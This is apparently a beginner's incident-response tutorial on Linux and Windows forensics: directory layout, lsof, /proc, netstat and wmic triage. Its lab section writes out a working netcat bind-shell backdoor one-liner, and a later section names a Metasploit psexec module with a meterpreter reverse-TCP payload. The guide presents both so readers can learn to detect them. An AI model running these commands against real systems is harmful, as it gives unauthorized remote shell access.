# The Cyber Detective's Field Guide: Linux & Windows Forensics

## 🎯 Welcome to the Crime Scene

Imagine walking into a building where something's gone wrong. The lights are flickering, doors are opening by themselves, and you hear whispers in the walls. Your job? Figure out who broke in, how they did it, and what they're up to.

This is what investigating a compromised system feels like. And lucky for you, this guide will teach you how to be the detective who solves the case.

---

## 🐧 Part 1: Understanding Your Linux Crime Scene

### The Universal Translator: Why Bash Matters

Think of Linux distributions (Ubuntu, Fedora, Kali, etc.) like different dialects of the same language. Some people say "soda," others say "pop," but everyone understands what you mean. **Bash** is that universal language—master it once, and you can speak to any Linux system fluently.

It's like learning to drive stick shift: once you know it, you can drive any car.

Here is a Venn diagram showing different Linux distributions and the central role of Bash:
<img width="891" height="852" alt="Linux Distributions and Bash" src="https://github.com/user-attachments/assets/e5566d91-4dd4-4740-be0f-498cfd1b05d5" />

### The Building's Blueprint: Linux Directory Structure

Every Linux system is like a massive building, and each floor has a specific purpose:

**🏠 The Lobby (/)** - The root directory. Everything starts here.

**🔧 The Maintenance Room (/bin)** - Where all the essential tools live. Commands like `ls`, `cat`, and `grep` hang out here. When you type a command, your system checks this room first (using something called `$PATH`).

**👢 The Boiler Room (/boot)** - Contains the engine that starts everything: the Linux kernel. It's like keeping backup engines in case the new one doesn't work.

**🎛️ The Equipment Closet (/dev)** - This is weird but cool: Linux treats *everything* as a file. Your keyboard? File. Your hard drive? File. Even `/dev/urandom` (a random number generator)—also a file. 

> **Pro tip**: Never run `cat /dev/urandom`. It's like opening a fire hose in your terminal—pure chaos.

**⚙️ The Control Center (/etc)** - Every program's settings are stored here. Unlike Windows (where settings are scattered everywhere), Linux keeps it organized. Need to configure your network? It's in `/etc`. Email server? Also `/etc`. It's beautiful.

**🏡 The Apartments (/home)** - Each user gets their own space. Your files, your settings, your mess.

**📚 The Library (/lib)** - Shared code that programs borrow. Think of it like a public library where programs check out the functions they need.

**💾 The Storage Units (/media & /mnt)** - Where you attach external drives or network folders.

**📦 The Warehouse (/opt)** - Self-contained apps that bring their own everything—like a food truck that doesn't need your kitchen.

**🧠 The Building's Memory (/proc)** - This is **magic**. It doesn't actually exist on your hard drive—it's just a window into what's happening *right now*. Every running program gets a folder here with its Process ID (PID). This is where cyber detectives do their best work.

**👑 The Penthouse (/root)** - The administrator's private quarters. Mortals cannot enter.

**🔨 The Superintendent's Office (/sbin)** - System administration tools that keep the building running.

**📊 The Records Room (/var)** - Logs, logs, and more logs. Every event gets recorded here. This is often your first stop when investigating an incident.

---

## 🔍 Part 2: Your Detective Toolkit

### Becoming Root: The Master Key

```bash
sudo su -
```

This command is like picking up the building's master key. You become root—the all-powerful administrator. Use it wisely.

### Finding Hidden Evidence

In Linux, files that start with a dot (`.`) are hidden—think `.ssh_config` or `.bash_history`. They're not malicious by default; they're just tucked away to keep things tidy.

```bash
ls -lrta
```

This reveals everything: **l**ong format, **r**everse chronological, **t**ime sorted, **a**ll files (including hidden ones).

### The Search Warrant: Finding Files

```bash
locate filename
```

Need to find a file fast? `locate` searches a pre-built database. Just remember to update it first:

```bash
sudo updatedb
```

### Text Editors: Your Notepad

**vim** - The detective's choice. It's on every Linux system ever made. Commands are cryptic but powerful:
- `A` = start editing
- `Esc` = stop editing  
- `:wq` = save and quit
- `:q!` = quit without saving (abandon ship!)

**nano** - The friendly option. Commands are shown at the bottom. No mystery, no drama.

---

## 🕵️ Part 3: Finding the Bad Guys

### The "Ping, Port, Parse" Method

When troubleshooting connections, follow this ritual:

1. **Ping**: Can you reach the target?
   ```bash
   ping google.com
   ```
   
2. **Port**: Is the service actually listening?
   ```bash
   nmap -p 80,443 target.com
   ```
   
3. **Parse**: Read the error messages. They're trying to tell you something!

### The All-Seeing Eye: lsof

`lsof` stands for "List Open Files," but remember: *everything in Linux is a file*. Network connections? Files. Running programs? Files. This makes `lsof` absurdly powerful.

```bash
lsof -i        # Show all internet connections
lsof -i -P     # Show with raw port numbers
lsof -p 1234   # Show everything process 1234 is touching
```

This is your X-ray vision into the system.

### Process Monitoring: Who's Doing What?

```bash
ps aux         # Snapshot of all processes
top            # Live view (like Task Manager)
```

Press `Q` to escape from `top`—otherwise you're stuck watching processes forever.

### Network Detective Work

```bash
ip a           # Show network adapters and IP addresses
ping target    # "Hey, are you there?" (Packet Internet Groper)
```

---

## 🚪 Part 4: The Backdoor Lab (Things Get Real)

### Creating a Backdoor (For Educational Purposes!)

Here's where it gets spicy. You'll use **three terminals**:

1. **Terminal 1**: Run the backdoor
2. **Terminal 2**: Connect to it
3. **Terminal 3**: Hunt for it (detective mode)

#### The Secret Pipe Trick

```bash
mkfifo backpipe
```

This creates a FIFO (First-In, First-Out) pipe—a virtual tunnel between processes. Think of it like a pneumatic tube at a bank drive-through.

#### The One-Liner Backdoor

This command is both beautiful and terrifying:

```bash
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
```

**Translation**: Bash redirects input/output through the `backpipe`, which connects to netcat listening on port 2222. Anyone connecting to port 2222 gets a shell. No fancy malware needed—just standard Linux tools.

**Why it's scary**: It doesn't leave obvious logs, and every Linux system has these tools.

---

## 🔦 Part 5: Hunting the Backdoor

### Step 1: Find Suspicious Connections

```bash
lsof -i -P
```

Look for:
- Weird ports (like 2222, 4444, 31337)
- Connections to strange IP addresses
- Services you don't recognize

### Step 2: Investigate the Process

Found something fishy? Get its Process ID (PID), then:

```bash
lsof -p [PID]
```

This shows everything the process is touching—files, libraries, network connections. It's like pulling their phone records.

### Step 3: Examine the Executable in Memory

Here's the cool part: even if the attacker deleted their malware from disk, it still exists in memory while running.

```bash
cd /proc/[PID]
strings exe | less
```

This extracts human-readable text from the running program. You'll see error messages, capabilities, often even the program's name. It's like finding their ID card.

### Step 4: Extract Deleted Files

If the executable was deleted:

```bash
cp /proc/[PID]/exe /tmp/suspicious_program
```

Boom—you just recovered deleted malware from memory. CSI has nothing on you.

To find deleted executables:

```bash
lsof +L1
```

---

## 🪟 Part 6: Windows Forensics

### Network Connections First

On Windows, **never start with `tasklist`**—it's overwhelming. Start with network activity.

```cmd
net view      # Show shared folders
net session   # Show inbound SMB connections
net use       # Show outbound mounted shares
```

### The Golden Command: netstat -naob

This is your Swiss Army knife:

```cmd
netstat -naob
```

**What each flag means:**
- **n**: Numbers only (no name resolution)
- **a**: All connections
- **o**: Show Process IDs
- **b**: Show executable names

**Output**: Every connection paired with the exact program making it. Gold.

```cmd
netstat -f    # Try to resolve domain names
```

This might reveal connections to `sketchy-ad-service.ru`—red flag!

---

## 🧪 Part 7: Windows Process Investigation

### Tasklist Evolution

Basic `tasklist` is useless for malware hunting. Level up:

```cmd
tasklist /svc        # Show services per process
tasklist /m          # Show all DLLs loaded
tasklist /m <DLL>    # Which processes use this DLL?
tasklist /fi "PID eq 1234"  # Filter by Process ID
```

**Why DLLs matter**: Malware often injects malicious DLLs into legitimate processes. If `svchost.exe` is connected to a Russian server, it might have a bad DLL hitchhiking inside.

### WMIC: The Power Tool

WMIC (Windows Management Instrumentation Command) is like having admin console access:

```cmd
wmic process list full  # Everything about all processes
wmic process where processid=1234 get parentprocessid,processid,name
wmic process where processid=1234 get commandline
```

**The parent-child trick**: If `cmd.exe` spawned `powershell.exe` which spawned `suspicious.exe`, you can trace the infection chain backward.

**Command line forensics**: See exactly how the malware was launched—often revealing hardcoded IPs or passwords.

---

## 🎪 Part 8: Real-World Malware Example

### The Metasploit Demo

The lab uses **psexec** (a legitimate Windows admin tool) weaponized for evil:

```
exploit/windows/smb/psexec
payload: windows/meterpreter/reverse_tcp
```

**How it works**:
1. Uses valid credentials (stolen or guessed)
2. Leverages Windows' built-in service manager
3. Executes a service remotely
4. Gives attacker a shell

**Why it's sneaky**: It uses Windows' own tools. No malware file needed—just credentials.

### PowerShell Obfuscation

Malware loves PowerShell because:
- It's on every Windows machine
- It can be encoded/obfuscated
- Many EDR products struggle with it

```powershell
powershell.exe -enc [base64_garbage_here]
```

If you see this, something's wrong.

---

## 🎓 Part 9: Level Up Your Skills

### Tools Worth Knowing

**Deep Blue CLI**: Eric Conrad's triage tool for analyzing Windows logs.

**Chris Trunzer's WMIC research**: Black Hat talks on using WMIC for persistence and lateral movement.

---

## 💻 Bonus: Hardware Recommendations

**Linux Desktops**: System76 (Pop!_OS) for desktop, but their laptops aren't travel-tough.

**Laptops**: Lenovo ThinkPad running Fedora—built like a tank.

**Password Cracking Rigs**: Dedicated GPU setups (Kraken, Cthulhu) for serious work.

---

## 🎬 Final Thoughts

You're no longer just running commands—you're investigating crime scenes, following digital breadcrumbs, and thinking like both the attacker and defender.

**Remember**:
- Start with network connections
- Follow the Process IDs
- Everything in Linux is a file (use that to your advantage)
- DLLs can hide in legitimate processes
- The command line never lies

Now go forth and hunt some backdoors. 🕵️‍♂️🔍

---

*"In cyber defense, you're not just learning commands—you're learning to think like a detective in a digital world where the criminal could be anywhere, hiding in plain sight."*

